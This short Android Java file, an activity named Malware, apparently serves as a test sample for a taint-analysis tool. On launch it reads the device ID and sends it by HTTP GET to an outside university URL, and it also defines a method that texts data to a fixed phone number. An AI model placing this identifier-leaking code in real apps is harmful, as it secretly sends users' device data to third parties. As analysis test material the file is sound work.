package stamp.stanford.malware;

import android.app.Activity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import java.util.ArrayList;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;

public class Malware extends Activity {
    public static void leakSMS(String msg) {
	SmsManager sms = SmsManager.getDefault();
	sms.sendMultipartTextMessage("9995556677", null, sms.divideMessage(msg), null, null);
    }

    public static void leakHTTP(String msg) {
	try {
	    new DefaultHttpClient().execute(new HttpGet("http://stanford.edu/~subodh/cgi-bin/stamp/id.php?gps=" + msg));
	} catch(Exception e) {}
    }

    public String taintDeviceId() {
	return ((TelephonyManager)getSystemService(TELEPHONY_SERVICE)).getDeviceId();
    }

    @Override public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
	ArrayList<String> list = new ArrayList<String>();
	list.add(taintDeviceId());
	leakHTTP(list.get(0));
    }
    
    @Override public void onStart(){
	super.onStart();
    }
}
